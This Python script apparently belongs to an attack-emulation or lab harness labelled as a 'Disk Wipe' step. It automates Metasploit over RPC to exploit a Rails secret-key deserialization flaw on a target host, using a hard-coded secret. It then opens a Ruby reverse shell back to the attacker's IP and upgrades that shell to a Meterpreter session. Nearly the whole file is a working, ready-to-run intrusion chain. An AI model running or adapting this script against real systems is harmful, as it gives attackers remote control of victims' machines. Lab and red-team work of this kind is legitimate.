import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def main(argv):
    # Arguments: 0=script, 1=folder, 2=my_ip, 3=target_ip
    if len(argv) < 4:
        print("[ERROR] Missing arguments.")
        print("Usage: python3 test_dw_3.py <folder> <my_ip> <target_ip>")
        return

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    print(f"--- [Step 3: Disk Wipe] Initial Access (Rails Exploit) ---")
    print(f"Target: {target_ip} | Attacker: {my_ip}")
    
    # Sleep 60s (Script Requirement)
    time.sleep(60)

    client = MsfRpcClient('kali')
    
    try:
        # 1. Record sessions before attack
        sessions_before = set(client.sessions.list.keys())
        print(f"Active Sessions Before Attack: {list(sessions_before)}")

        # 2. Create Console
        cid = client.consoles.console().cid
        console = client.consoles.console(cid)
        print(f"Console {cid} created.")
        
        # 3. Prepare Commands (Rails Secret Deserialization)
        commands = [
            'use exploit/multi/http/rails_secret_deserialization',
            f'set RHOSTS {target_ip}',
            'set RPORT 8181',
            'set TARGETURI /',
            'set SECRET a7aebc287bba0ee4e64f947415a94e5f', # Vulnerable secret key
            f'set LHOST {my_ip}',
            'set LPORT 4444',
            'set PAYLOAD ruby/shell_reverse_tcp', # Ruby payload for Rails app
            'set VERBOSE true', 
            'run'
        ]

        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5)

        # 4. Stream Output (Polling Loop)
        print("--- Metasploit Exploit Output ---")
        max_wait_time = 60
        start_time = time.time()
        
        while True:
            result = console.read()
            data = result.get('data', '')
            
            if data:
                print(data, end='')
                
                if "Command shell session" in data and "opened" in data:
                    print("\n[+] Shell session opened!")
                
                if "Exploit completed" in data:
                    break
            
            if time.time() - start_time > max_wait_time:
                print("\n[!] Exploit execution timed out.")
                break
            
            time.sleep(1)

        # 5. Check for New Session & Upgrade to Meterpreter
        print("\n--- Checking for Initial Session ---")
        time.sleep(10)
        
        sessions_mid = set(client.sessions.list.keys())
        new_sessions = sessions_mid - sessions_before
        
        if new_sessions:
            initial_session_id = list(new_sessions)[0]
            print(f"[SUCCESS] Initial Shell Session: {initial_session_id}")
            
            # --- Post-Exploitation: Upgrade to Meterpreter ---
            print(f"--- Upgrading Session {initial_session_id} to Meterpreter ---")
            
            commands_upgrade = [
                'use post/multi/manage/shell_to_meterpreter',
                f'set SESSION {initial_session_id}',
                'set LPORT 4433', # Use a different port for upgrade
                'run'
            ]
            
            for cmd in commands_upgrade:
                console.write(cmd)
                time.sleep(0.5)
                
            # Poll again for upgrade output
            start_upgrade = time.time()
            while True:
                data = console.read().get('data', '')
                if data:
                    print(data, end='')
                    if "Post module execution completed" in data:
                        break
                if time.time() - start_upgrade > 60:
                    break
                time.sleep(1)
                
            # Final Check for Meterpreter Session
            time.sleep(10)
            sessions_final = set(client.sessions.list.keys())
            meterpreter_sessions = sessions_final - sessions_mid
            
            if meterpreter_sessions:
                final_id = list(meterpreter_sessions)[0]
                print(f"[SUCCESS] Meterpreter Session Created: {final_id}")
                print(f"NEW_SESSION_ID:{final_id}")
            else:
                print("[WARNING] Upgrade failed. Only initial shell available.")
                print(f"NEW_SESSION_ID:{initial_session_id}")
                
        else:
            print("[FAILURE] No session created.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'console' in locals():
            console.destroy()

    time.sleep(30)

if __name__ == "__main__":
    main(sys.argv)